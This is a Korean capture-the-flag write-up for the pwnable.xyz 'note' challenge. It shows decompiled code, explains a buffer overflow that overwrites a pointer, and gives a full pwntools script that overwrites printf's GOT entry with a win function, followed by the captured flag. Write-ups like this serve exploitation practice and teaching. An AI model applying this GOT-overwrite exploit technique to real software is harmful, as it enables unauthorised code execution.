# [pwnable.xyz] note

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Note taking 101
>
> Release: [note.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8934764/note.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174466003-73289e11-6b40-4111-ad62-b6e9010e46ff.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `edit_note()`

```c
void edit_note()
{
  int len; // [rsp+4h] [rbp-Ch]
  void *buf; // [rsp+8h] [rbp-8h]

  printf("Note len? ");
  len = read_int32();
  buf = malloc(len);
  printf("note: ");
  read(0, buf, len);
  strncpy(note, (const char *)buf, len);
  free(buf);
}
```

원하는 길이만큼 메모리를 할당받아서 `buf`에 문자열을 입력할 수 있다. 입력한 `buf`의 내용은 `note`(`0x601480`)로 `len`만큼 복사된다.

### `edit_desc()`

```c
ssize_t edit_desc()
{
  if ( !noteAddr )
    noteAddr = malloc(0x20uLL);
  printf("desc: ");
  return read(0, noteAddr, 0x20uLL);
}
```

`noteAddr`(`0x6014a0`)에 아무 값도 없으면 새로 메모리를 할당받아서 그 주소를 `noteAddr`에 넣는다. 그리고 나서 `noteAddr`에 있는 주소에 최대 `0x20`바이트의 문자열을 입력받는다.

## Exploit

`edit_note()`에서 `note`로 복사할 수 있는 문자열의 길이에는 제한이 없기 때문에 BOF가 발생한다. 이를 이용하여 `note`의 바로 뒤에 있는 `noteAddr`에 원하는 주소를 넣을 수 있다. 그리고 나면 `edit_desc()`에서 그 주소에 원하는 값을 쓸 수 있다.

이를 이용하여 `printf()`의 GOT를 `win()`의 주소로 덮으면, `print_menu()` 내부에서 `printf()`가 호출되어 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30016)

sla = r.sendlineafter
sa = r.sendafter

win = 0x40093c
printf_got = 0x601238

sla('> ', '1')
sla('Note len? ', str(0x28))
sa('note: ', b'a' * 0x20 + p64(printf_got))

sla('> ', '2')
sa('desc: ', p64(win))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to svc.pwnable.xyz on port 30016: Done
[*] Switching to interactive mode
FLAG{useless_if_u_cant_print_the_note}
```